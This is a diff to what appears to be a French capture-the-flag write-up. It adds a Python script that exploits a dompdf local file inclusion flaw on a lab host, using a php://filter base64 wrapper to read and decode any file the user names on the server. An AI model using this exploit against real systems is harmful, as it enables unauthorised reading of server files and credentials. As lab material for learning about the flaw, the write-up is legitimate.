@@ -133,5 +133,29 @@ echo $c | base64 -d
 L'équivalent en python :
 
 ```py
-print("test")
+import argparse
+import urllib.request
+import base64
+
+parser = argparse.ArgumentParser()
+parser.add_argument("file")
+args = parser.parse_args()
+
+
+u = 'http://10.10.10.67:80/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='
+
+try:
+	request = urllib.request.urlopen(u + args.file)
+
+	output = request.read()
+	
+	if output:
+		contenu = output.decode()
+		resultat = contenu[contenu.find("[(")+2:contenu.find(")]")]
+		dechiffre = base64.b64decode(resultat).decode('utf8')
+		print(dechiffre)
+
+except urllib.error.HTTPError:
+	print("Permission Denied for www-data.")
 ```
+
